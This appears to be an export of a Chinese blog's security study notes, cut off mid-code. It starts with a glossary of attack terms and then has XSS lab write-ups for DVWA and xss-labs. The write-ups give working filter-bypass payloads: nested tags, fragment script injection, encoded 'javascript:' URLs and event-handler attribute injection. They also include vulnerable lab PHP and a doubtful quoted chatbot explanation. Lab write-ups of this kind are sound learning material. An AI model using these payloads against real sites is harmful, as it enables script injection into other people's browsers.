隔离区</p><p>可以理解为对外服务区，如网站、论坛等。为保证安全性，会通过防火墙将内、外网、DMZ，进行安全隔离</p><p>外网用户可以直接访问</p></blockquote><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><blockquote><p>Proxy      常用于身份隐藏、端口转发等</p><ul><li>身份隐藏： 攻击者可以通过第三方代理服务器访问目标系统，从而隐藏自己的真实ip，让别人找不到自己。</li><li>端口转发： 可以通过代理软件穿透内网限制，访问核心内网服务器。</li></ul></blockquote><hr><h2 id="攻击面术语"><a href="#攻击面术语" class="headerlink" title="攻击面术语"></a>攻击面术语</h2><p>从攻击者攻击角度的不同，可以划分为</p><ul><li><p>互联网链路攻击</p><blockquote><p>所有暴露的互联网应用： web服务器、数据库服务器、各端口开放服务</p></blockquote></li><li><p>社会工程学攻击</p><blockquote><p>鱼叉攻击、鲸钓攻击、水坑攻击</p></blockquote></li><li><p>近源攻击</p><blockquote><p>USB攻击、Wi-Fi攻击、门禁攻击</p></blockquote></li><li><p>供应链攻击</p><blockquote><p>合作伙伴、供应商（假设a公司使用b公司的产品，但是b公司的产品有漏洞。那么可以利用b公司产品的漏洞攻击a公司。）</p></blockquote></li></ul><hr><h2 id="攻击活动术语"><a href="#攻击活动术语" class="headerlink" title="攻击活动术语"></a>攻击活动术语</h2><h3 id="APT攻击"><a href="#APT攻击" class="headerlink" title="APT攻击"></a>APT攻击</h3><blockquote><p>APT： 高级持续性威胁，通常指处于政治或商业动机，针对特定目标进行的手段高超、低调隐蔽、时间持久、精心策划的攻击。</p></blockquote><p>如美国震网病毒攻击伊朗铀浓缩设备</p><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><blockquote><p>是指受信任的第三方通过模拟黑客的攻击技术与手段，对目标网络、系统进行攻击测试，发现安全隐患并给出安全加固建议的一种安全测试和评估方法。</p></blockquote><hr><h2 id="攻击手段术语"><a href="#攻击手段术语" class="headerlink" title="攻击手段术语"></a>攻击手段术语</h2><h3 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h3><blockquote><p>攻击者利用漏洞（如sql注入）入侵网站将数据库拖出到黑客本地服务器的过程</p></blockquote><h3 id="洗库"><a href="#洗库" class="headerlink" title="洗库"></a>洗库</h3><blockquote><p>攻击者“洗”出账号的价值，如果是金融账号则财产转移，如果是游戏账号则盗卖道具或虚拟货币</p></blockquote><h3 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h3><blockquote><p>攻击者将其收集到的数据库（社工库），制作成相应的（账号密码）字典表，之后尝试批量登录其他网站，“撞”出可以登录使用的账号。</p></blockquote><h3 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h3><blockquote><p>拒绝服务攻击，利用网络协议缺陷进行攻击，会使服务器或网络无法提供正常的服务。</p></blockquote><h3 id="DDoS攻击"><a href="#DDoS攻击" class="headerlink" title="DDoS攻击"></a>DDoS攻击</h3><blockquote><p>利用控制成百上千台肉鸡（傀儡机），组成一个攻击群，在同一时刻对目标主机发起攻击。</p><p>主要分为两大类：</p><ul><li>带宽消耗型攻击，如UDP泛洪攻击</li><li>资源消耗型攻击，如cc攻击（发送大量HTTP请求</li></ul></blockquote><h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><blockquote><p>是一门艺术。</p><p> 利用人的粗心、轻信、疏忽和警惕性不高来操纵其执行预期的动作或泄露机密信息。</p></blockquote><h3 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h3><blockquote><p>入侵者采用社会工程学方法，伪装成可以信任的人或机构，通过高仿网站、欺诈邮件、虚假短信方式，引诱受害者浏览、下载、安装、执行，最终实现对目标对象的入侵和控制。</p></blockquote><p>可分为：</p><ul><li><p>鱼叉攻击</p><blockquote><p>一种精确的钓鱼攻击，对特定某个人或某类人</p></blockquote></li><li><p>鲸钓攻击</p><blockquote><p>目标是钓一个十分重要的人（大鱼，某企业高管）。</p></blockquote></li><li><p>水坑攻击</p><blockquote><p>特地挖一个水坑，等人跳进来。 </p><p>如某类人玩游戏特别菜，想开某种外挂，黑客利用这种心理，开发外挂并植入特洛伊木马。当人运行外挂时，黑客就能通过木马控制目标的机器了。</p></blockquote></li></ul><p>等方式</p><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><blockquote><p>通过伪造或者控制一个服务流程中某台重要的中间设备，把请求服务的一方引导至错误的方向，导致其收到伪造的响应。</p><p>如： 劫持dns服务器，向请求访问某域名用户主机发送错误的ip地址，将其引导至自己建立的假的目标服务器。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> 安全基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于锚点注入的深入探讨</title>
      <link href="/2023/04/21/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E5%85%B3%E4%BA%8E%E9%94%9A%E7%82%B9%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B7%B1%E5%85%A5%E6%8E%A2%E8%AE%A8/"/>
      <url>/2023/04/21/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E5%85%B3%E4%BA%8E%E9%94%9A%E7%82%B9%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B7%B1%E5%85%A5%E6%8E%A2%E8%AE%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="关于锚点注入的深入探讨"><a href="#关于锚点注入的深入探讨" class="headerlink" title="关于锚点注入的深入探讨"></a>关于锚点注入的深入探讨</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>dvwa靶场  high难度下的 dom型XSS关卡的解法很有意思</p><p>这关使用了锚点注入的方式，通过在URL后面添加#和script标签，就能使浏览器执行脚本</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413204911747.png" alt="image-20230413204911747"></p><p>以下是chatGPT对锚点注入的解释：</p><blockquote><p>锚点注入： 在URL的井号后面添加JavaScript脚本是一种称为“锚点注入”的技术，它可以实现在页面加载时执行JavaScript代码。但是，这种技术并不是所有浏览器都支持，而且也存在一些安全风险。</p><p>如果浏览器支持锚点注入，那么在URL的井号后面添加JavaScript脚本是可以运行的。例如，以下URL会在页面加载时弹出一个警告框：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/page.html#&lt;script&gt;alert(&#x27;Hello, world!&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>但是，为了保证网站的安全性，大多数现代浏览器已经禁止了锚点注入这种技术。因此，不建议在URL中使用锚点注入来执行JavaScript代码，而应该使用更安全的方法，如在HTML文档中嵌入JavaScript代码或在外部JavaScript文件中编写代码。</p></blockquote><p>关键： 在井号后面添加javascript脚本</p><p>我当时心想，这么有意思？那么是不是在其他地方也能这么弄? 只需要在URL后面添加上# 和script标签，就能简单实现XSS攻击</p><p>后来，我在反射型的XSS靶场试了一遍，不成功。在存储型的XSS靶场也试了一遍，照样不成功。</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230421001044917.png" alt="image-20230421001044917"></p><p>没有任何反应。。。。</p><h2 id="问题解决过程"><a href="#问题解决过程" class="headerlink" title="问题解决过程"></a>问题解决过程</h2><p>注意到只有DOM型的XSS靶场才可能用这种方法成功通关，而反射型和存储型的全部失败</p><p>那么问题可能就出在不同类型XSS的原理上</p><p>回顾DOM型XSS和反射型XSS攻击原理</p><p>DOM型XSS:</p><blockquote><p>DOM型XSS漏洞是由于JavaScript代码直接操作了DOM（文档对象模型）而导致的漏洞</p></blockquote><p>反射型XSS:</p><blockquote><p>在反射型XSS攻击中，攻击者需要诱导受害者点击一个带有恶意代码的链接，然后受害者的浏览器会向服务器发送请求，将恶意代码作为参数传递给服务器，服务器再将恶意代码反射回受害者的浏览器执行。</p></blockquote><p>也就是说：</p><p>DOM型XSS攻击是客户端通过JavaScript脚本直接将恶意代码插入html页面中的。</p><p>而反射型XSS是等待服务端对请求进行处理，在发送回响应页面。恶意代码实际上是由服务器端插入到html页面中的。</p><p>STFW</p><blockquote><p>由于反射型XSS漏洞是在后端执行的，因此使用锚点来实现攻击可能会失败，因为浏览器可能会对URL中的锚点进行过滤或忽略，而不会执行其中的JavaScript代码。</p></blockquote><p>至此，问题解决</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>锚点注入是个好东西，但是只能运用在存在DOM型XSS漏洞的场景。</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实用姿势总结</title>
      <link href="/2023/04/20/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/04/20/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS实用绕过姿势总结"><a href="#XSS实用绕过姿势总结" class="headerlink" title="XSS实用绕过姿势总结"></a>XSS实用绕过姿势总结</h1><h2 id="1-嵌套字符以应对字符删除型过滤"><a href="#1-嵌套字符以应对字符删除型过滤" class="headerlink" title="1.  嵌套字符以应对字符删除型过滤"></a>1.  嵌套字符以应对字符删除型过滤</h2><p>如：xss-labs-master  level7</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230418113233600.png" alt="image-20230418113233600"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230418113429060.png" alt="image-20230418113429060"></p><p>此处直接删除了字符script和href</p><p>可以采用嵌套的方式绕过</p><blockquote><ul><li>hhrefref</li><li>sscriptcript</li></ul></blockquote><p>此时，只会删除掉特定的连续字符串，但是剩下的字符又会重新组合成这个字符串，达成绕过的目的。</p><hr><h2 id="2-尝试使用锚点注入的方式绕过（不一定会成功）"><a href="#2-尝试使用锚点注入的方式绕过（不一定会成功）" class="headerlink" title="2.  尝试使用锚点注入的方式绕过（不一定会成功）"></a>2.  尝试使用锚点注入的方式绕过（不一定会成功）</h2><blockquote><p>锚点注入： 在URL的井号后面添加JavaScript脚本是一种称为“锚点注入”的技术，它可以实现在页面加载时执行JavaScript代码。但是，这种技术并不是所有浏览器都支持，而且也存在一些安全风险。</p><p>如果浏览器支持锚点注入，那么在URL的井号后面添加JavaScript脚本是可以运行的。例如，以下URL会在页面加载时弹出一个警告框：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/page.html#&lt;script&gt;alert(&#x27;Hello, world!&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>但是，为了保证网站的安全性，大多数现代浏览器已经禁止了锚点注入这种技术。因此，不建议在URL中使用锚点注入来执行JavaScript代码，而应该使用更安全的方法，如在HTML文档中嵌入JavaScript代码或在外部JavaScript文件中编写代码。</p></blockquote><p>例：dvwa  DOM型XSS  level high</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413193725293.png" alt="image-20230413193725293"></p><p>这里对url中的字符进行了严密的过滤，但是没有过滤掉  ‘#‘</p><p>在URL最后添加上#和脚本语句</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413204911747.png" alt="image-20230413204911747"></p><p>发现弹窗了</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413205049632.png" alt="image-20230413205049632"></p><p>检查网页，发现选项English部分的下面多了script标签（）</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420231507666.png"></p><h2 id="3-script标签被截断的应对方法-如截断成s-cript"><a href="#3-script标签被截断的应对方法-如截断成s-cript" class="headerlink" title="3. script标签被截断的应对方法 如截断成s_cript"></a>3. script标签被截断的应对方法 如截断成s_cript</h2><p>比较简单，不放图举例了</p><blockquote><ul><li>大小写绕过</li><li>使用img标签</li><li>使用a标签</li><li>给该文本框或下拉列表添加事件属性</li></ul></blockquote><hr><h2 id="4-存储型XSS限制输入字符个数的应对方法"><a href="#4-存储型XSS限制输入字符个数的应对方法" class="headerlink" title="4.  存储型XSS限制输入字符个数的应对方法"></a>4.  存储型XSS限制输入字符个数的应对方法</h2><p>存储型，目的是把脚本存入服务器数据库里</p><p>此时可以通过用浏览器检查功能修改标签的限制属性，再往里边写代码</p><p>例：dvwa存储型XSS</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416153751520.png" alt="image-20230416153751520"></p><blockquote><p>存储型，注意到有两个文本框，一个是姓名，一个是评论消息。</p><p>可能只对评论信息做了过滤，名字通过前端限制了输入字长，但没做过滤。</p><p>尝试修改名字的限制长度，然后在名字的文本框发脚本。</p></blockquote><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154209736.png" alt="image-20230416154209736"></p><blockquote><p>改成100，然后痛快地写脚本</p></blockquote><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154853881.png" alt="image-20230416154853881"></p><hr><h2 id="5-页面回显的字符被转义，而输入框内容未被清空"><a href="#5-页面回显的字符被转义，而输入框内容未被清空" class="headerlink" title="5.  页面回显的字符被转义，而输入框内容未被清空"></a>5.  页面回显的字符被转义，而输入框内容未被清空</h2><p>此时可以推断出输入框value属性的值未被清空，可以使用双引号或单引号闭合value，再添加属性</p><p>例：xss-labs-master  level2</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416163152800.png" alt="image-20230416163152800"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416164148387.png" alt="image-20230416164148387"></p><hr><h2 id="6-使用unicode编码绕过"><a href="#6-使用unicode编码绕过" class="headerlink" title="6. 使用unicode编码绕过"></a>6. 使用unicode编码绕过</h2><p>当URL中 script、onclick、href  等特殊字符串被过滤掉时，可以将脚本部分使用unicode编码，再将编码后的字符串填入达成目的。</p><p>例： xss-labs-master  level8</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420163308647.png" alt="image-20230420163308647"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420163537287.png" alt="image-20230420163537287"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420163557363.png" alt="image-20230420163557363"></p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS的绕过姿势（四）</title>
      <link href="/2023/04/20/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>/2023/04/20/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS的绕过姿势（四）"><a href="#XSS的绕过姿势（四）" class="headerlink" title="XSS的绕过姿势（四）"></a>XSS的绕过姿势（四）</h1><p>本章重点挑xss-labs-master靶场里一些经典的例子探讨</p><h2 id="level2-闭合文本框"><a href="#level2-闭合文本框" class="headerlink" title="level2  闭合文本框"></a>level2  闭合文本框</h2><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416163152800.png" alt="image-20230416163152800"></p><p>查看网页源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level2.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">&quot;搜索&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看的出来 回显的消息被转义了，但是搜索框里的内容还在，看来搜索框是有value属性的</p><p>换思路 提前闭合value属性</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416164148387.png" alt="image-20230416164148387"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416164202952.png" alt="image-20230416164202952"></p><p>成功</p><hr><h2 id="level5-闭合文本框"><a href="#level5-闭合文本框" class="headerlink" title="level5 闭合文本框"></a>level5 闭合文本框</h2><p>这一关把on开头的字符串全部替换成了 on_ 开头，script标签也替换成了scr_ipt标签</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416164916848.png" alt="image-20230416164916848"></p><p>尝试大小写绕过</p><p>失败</p><p>on开头的事件没办法触发了 所以img标签此路不通</p><p>换标签：</p><p>换a标签，a标签里有href属性，在此嵌入脚本</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416165821724.png" alt="image-20230416165821724"></p><p>出现了可以点击的标签，成功</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416165907920.png" alt="image-20230416165907920"></p><hr><h2 id="level7-使用嵌套应对删除字符串的过滤"><a href="#level7-使用嵌套应对删除字符串的过滤" class="headerlink" title="level7 使用嵌套应对删除字符串的过滤"></a>level7 使用嵌套应对删除字符串的过滤</h2><p>测试：</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230418113233600.png" alt="image-20230418113233600"></p><p>发现script 和 href被直接删除了</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230418113429060.png" alt="image-20230418113429060"></p><p>如图 当“href”和“script”标签被过滤删除时，可以使用嵌套的方法绕过。</p><p>如：</p><blockquote><ul><li>hhrefref</li><li>sscriptcript</li></ul></blockquote><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230418112906538.png" alt="image-20230418112906538"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230418113948585.png" alt="image-20230418113948585"></p><p>成功</p><hr><h2 id="level-8-利用Unicode编码绕过"><a href="#level-8-利用Unicode编码绕过" class="headerlink" title="level 8 利用Unicode编码绕过"></a>level 8 利用Unicode编码绕过</h2><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420163308647.png" alt="image-20230420163308647"></p><p>这一关是利用页面特性：在文本框输入url，点击添加友情连接，给下面的超链接href属性赋值</p><p>这一关将常规的xss有关字符都过滤掉了。</p><p>此时可以使用unicode编码进行绕过</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420163537287.png" alt="image-20230420163537287"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420163557363.png" alt="image-20230420163557363"></p><p>成功。</p><h2 id="level9-添加特定字符串应付检测"><a href="#level9-添加特定字符串应付检测" class="headerlink" title="level9 添加特定字符串应付检测"></a>level9 添加特定字符串应付检测</h2><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420165217760.png" alt="image-20230420165217760"></p><p>这一关会对输入的URL进行检测，若无 ”http://“ 字符串则报错</p><p>可以在编码后的URL后面添加上注释掉的对应字符串进行绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">58</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">101</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">40</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">41</span>;<span class="comment">/* http:// */</span></span><br></pre></td></tr></table></figure><h2 id="level10-对带有隐藏属性的标签要有敏锐的嗅觉"><a href="#level10-对带有隐藏属性的标签要有敏锐的嗅觉" class="headerlink" title="level10 对带有隐藏属性的标签要有敏锐的嗅觉"></a>level10 对带有隐藏属性的标签要有敏锐的嗅觉</h2><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420170220631.png" alt="image-20230420170220631"></p><p>注意到这关的源码有三个被隐藏的input标签：</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420170340882.png" alt="image-20230420170340882"></p><p>此时猜测三个标签其中有一个可能使用get方法传值</p><p>此时对input标签一个个测试，尝试使用url改动其属性值，最终发现t_sort属性被修改</p><p>输入payload(因为标签被隐藏，所以需要加上type=“text” 来覆盖后面的隐藏属性)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230420171848379.png" alt="image-20230420171848379"></p><hr><p>以上是前十题中的几个典型绕过方式，后十题涉及到一些辅助工具的使用，将在后面补充。</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS的绕过姿势（三）</title>
      <link href="/2023/04/16/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2023/04/16/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS的绕过姿势（三）"><a href="#XSS的绕过姿势（三）" class="headerlink" title="XSS的绕过姿势（三）"></a>XSS的绕过姿势（三）</h1><p>本章提及的几种姿势将在dvwa靶场进行演示</p><h2 id="存储型XSS的绕过姿势"><a href="#存储型XSS的绕过姿势" class="headerlink" title="存储型XSS的绕过姿势"></a>存储型XSS的绕过姿势</h2><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416153751520.png" alt="image-20230416153751520"></p><p>URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_s/</span><br></pre></td></tr></table></figure><h3 id="安全等级：Medium"><a href="#安全等级：Medium" class="headerlink" title="安全等级：Medium"></a>安全等级：Medium</h3><h4 id="猜测与尝试"><a href="#猜测与尝试" class="headerlink" title="猜测与尝试"></a>猜测与尝试</h4><p>存储型，注意到有两个文本框，一个是姓名，一个是评论消息。</p><p>可能只对评论信息做了过滤，名字通过前端限制了输入字长，但没做过滤。</p><p>尝试修改名字的限制长度，然后在名字的文本框发脚本。</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154209736.png" alt="image-20230416154209736"></p><p>改成100，然后痛快地写脚本</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154341442.png" alt="image-20230416154341442"></p><p>失败：</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154409127.png" alt="image-20230416154409127"></p><p>推测可能对script标签做了过滤，老套路，换img</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154853881.png" alt="image-20230416154853881"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416154918355.png" alt="image-20230416154918355"></p><p>成功</p><p>尝试以下在评论消息框发同样的脚本</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416155125217.png" alt="image-20230416155125217"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416155137551.png" alt="image-20230416155137551"></p><p>失败</p><p>message直接没了……可能是过滤掉了尖括号</p><h4 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );<span class="comment">//返回去掉两边空格的字符串</span></span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );<span class="comment">//addslashes 向串中‘“\这些预定义字符添加反斜杠，strip_tags：剥去字符串中的 HTML 标签</span></span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );<span class="comment">//htmlspecialchars函数 老朋友</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span 